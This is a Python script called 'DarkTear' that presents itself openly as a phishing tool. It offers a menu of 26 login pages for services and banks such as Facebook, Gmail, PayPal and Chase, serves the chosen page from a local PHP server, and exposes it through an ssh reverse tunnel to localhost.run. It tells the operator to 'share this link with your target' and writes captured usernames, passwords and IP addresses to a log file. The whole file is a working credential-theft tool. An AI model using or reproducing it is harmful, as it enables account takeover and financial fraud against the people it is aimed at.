#!/usr/bin/env python3
# DarkTear v1.0 - by WastelandX
# SIMPLE: Logo → Pick Page → Tunnel Auto-Start (localhost.run)
# Works with mixed-case filenames in 'page/' folder.

import os
import sys
import time
import subprocess
import shutil
import glob
from datetime import datetime

# ========== COLORS ==========
R = '\033[91m'          # Red
B = '\033[96m'          # Electric Blue (for other elements)
DB = '\033[1;34m'       # Bold Dark Blue (for tunnel logo)
O = '\033[93m'          # Orange
G = '\033[92m'          # Green
Y = '\033[93m'          # Yellow
W = '\033[97m'          # White
RS = '\033[0m'          # Reset

# ========== LOGOS ==========
def show_main_logo():
    os.system('clear' if os.name == 'posix' else 'cls')
    logo = [
        "____    ____   ____   _  __",
        "|  _ \\  / _  | |  _ \\ | |/ /  Made",
        "| | | || | | | | |_) || ' |   By",
        "| |_| || |_| | |  _ < | . \\   WastelandX.",
        "|____/  \\___ | |_|_\\_\\|_|\\_\\",
        "|_   _|| ____| / _  ||  _ \\",
        "  | |  |  _|  | | | || |_) |",
        "  | |  | |___ | |_| ||  _ <",
        "  |_|  |_____| \\___ ||_| \\_\\"
    ]
    colors = [R, B, O]
    for line in logo:
        colored = ""
        for i, ch in enumerate(line):
            if ch == " ":
                colored += " "
            else:
                colored += f"{colors[i % 3]}{ch}"
        print(colored + RS)
    print(f"\n{R}Where DDoS and Phishing meets eachother.{RS}")
    print(f"{R}" + "═"*60 + f"{RS}\n")

def show_tunnel_logo():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{DB}")   # Bold Dark Blue
    print("██████  █████  ██████  ██   ██ ████████ ███████  █████  ██████")
    print("██   ██ ██   ██ ██   ██ ██  ██     ██    ██      ██   ██ ██   ██")
    print("██   ██ ███████ ██████  █████      ██    █████   ███████ ██████")
    print("██████  ██   ██ ██   ██ ██   ██    ██    ███████ ██   ██ ██   ██")
    print(f"{RS}\n")

# ========== PAGE LIST (TWO COLUMNS) ==========
PAGES = [
    ("01", "Facebook"), ("02", "Instagram"), ("03", "Gmail"),
    ("04", "Netflix"), ("05", "PayPal"), ("06", "GitHub"),
    ("07", "Roblox"), ("08", "Microsoft"), ("09", "Twitter/X"),
    ("10", "Amazon"), ("11", "Snapchat"), ("12", "TikTok"),
    ("13", "LinkedIn"), ("14", "Discord"), ("15", "Steam"),
    ("16", "Apple ID"), ("17", "Yahoo"), ("18", "WhatsApp"),
    ("19", "Spotify"), ("20", "Bank of America"), ("21", "Chase"),
    ("22", "Wells Fargo"), ("23", "IG Business"), ("24", "FB Business"),
    ("25", "Blockman GO"), ("26", "Custom Clone")
]
PAGES_DICT = {p[0]: p[1] for p in PAGES}

def show_page_menu():
    print(f"{B}[ SELECT LOGIN PAGE ]{RS}")
    print(f"{R}" + "═"*60 + f"{RS}")
    half = len(PAGES) // 2
    left = PAGES[:half]
    right = PAGES[half:]
    for i in range(len(left)):
        l_num, l_name = left[i]
        r_num, r_name = right[i] if i < len(right) else ("", "")
        l_str = f"  {O}[{l_num}]{W} {l_name:20}{RS}"
        if r_num:
            print(l_str + f"  {O}[{r_num}]{W} {r_name}{RS}")
        else:
            print(l_str)
    print(f"\n{R}" + "═"*60 + f"{RS}")

def find_page_file(choice, page_name):
    """
    Find the HTML file in 'page/' folder, case-insensitive.
    Returns full path if found, else None.
    """
    base_dir = "page"
    if not os.path.isdir(base_dir):
        return None

    # Try common filename patterns (lowercase, original, with spaces replaced)
    candidates = [
        f"{page_name.lower()}.html",
        f"{page_name}.html",
        page_name.lower().replace(" ", "_") + ".html",
        page_name.replace(" ", "_") + ".html",
        page_name.lower().replace(" ", "") + ".html",
        page_name.replace(" ", "") + ".html",
    ]
    # Also try using the choice number prefix (some users might have 01_facebook.html etc.)
    candidates.append(f"{choice}_{page_name.lower()}.html")
    candidates.append(f"{choice}_{page_name}.html")

    for cand in candidates:
        full = os.path.join(base_dir, cand)
        if os.path.isfile(full):
            return full

    # If still not found, do a case-insensitive glob search
    pattern = os.path.join(base_dir, "*")
    files = glob.glob(pattern)
    for f in files:
        if os.path.basename(f).lower() == page_name.lower() + ".html":
            return f
        if os.path.basename(f).lower() == page_name.lower().replace(" ", "_") + ".html":
            return f
        if os.path.basename(f).lower() == page_name.lower().replace(" ", "") + ".html":
            return f
    return None

# ========== SERVER & TUNNEL ==========
def start_php_server(port=8080):
    try:
        proc = subprocess.Popen(
            ["php", "-S", f"0.0.0.0:{port}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print(f"{G}[+] PHP server running on port {port}{RS}")
        return proc
    except FileNotFoundError:
        print(f"{R}[-] PHP not found. Install PHP first.{RS}")
        return None

def start_localhost_run(port=8080):
    print(f"{G}[+] Connecting to localhost.run...{RS}")
    try:
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:localhost:{port}", "localhost.run"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,   # Merge stderr into stdout
            text=True,
            bufsize=1
        )
        url_found = False
        print(f"{B}[i] Tunnel output:{RS}")
        while not url_found:
            line = proc.stdout.readline()
            if not line:
                # Process might have exited
                break
            print(line.strip())
            # Look for a line containing https:// and .localhost.run
            if "https://" in line and ".localhost.run" in line:
                # Extract URL (usually the last word, but sometimes embedded)
                parts = line.strip().split()
                for part in parts:
                    if part.startswith("https://") and ".localhost.run" in part:
                        url = part
                        break
                else:
                    # Fallback: take the whole line
                    url = line.strip()
                print(f"\n{G}[+] Public URL: {DB}{url}{RS}")
                print(f"{Y}[!] Share this link with your target.{RS}\n")
                url_found = True
        if not url_found:
            print(f"{Y}[!] Could not extract URL. Check above.{RS}")
        return proc
    except Exception as e:
        print(f"{R}[-] Tunnel failed: {e}{RS}")
        return None

# ========== CREDENTIAL LOGGER ==========
def log_credentials(page, username, password, ip="Unknown"):
    os.makedirs("logs", exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("logs/captured.txt", "a") as f:
        f.write(f"\n[{ts}]\nPage: {page}\nIP: {ip}\nUsername: {username}\nPassword: {password}\n{'-'*40}\n")
    print(f"{G}[+] Credentials saved!{RS}")

# ========== MAIN ==========
def main():
    show_main_logo()
    show_page_menu()
    choice = input(f"\n{O}[?]{W} Select page [01-26]: {RS}").strip().zfill(2)

    if choice not in PAGES_DICT:
        print(f"{R}[-] Invalid selection{RS}")
        sys.exit(1)

    page_name = PAGES_DICT[choice]
    html_file = find_page_file(choice, page_name)

    if not html_file:
        print(f"{R}[-] HTML file not found for {page_name}. Check 'page/' folder.{RS}")
        print(f"{Y}[!] Make sure the file exists (e.g., page/discord.html, page/Instagram.html){RS}")
        sys.exit(1)

    print(f"{G}[+] Selected: {page_name}{RS}")
    time.sleep(1)

    show_tunnel_logo()
    shutil.copy(html_file, "index.html")
    print(f"{G}[+] Page copied to index.html{RS}")

    php = start_php_server()
    if not php:
        sys.exit(1)

    tunnel = start_localhost_run()
    if not tunnel:
        php.terminate()
        sys.exit(1)

    print(f"\n{Y}[!] Press Ctrl+C to stop the attack{RS}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Shutting down...{RS}")
        php.terminate()
        tunnel.terminate()
        print(f"{G}[+] DarkTear stopped{RS}")

if __name__ == "__main__":
    main()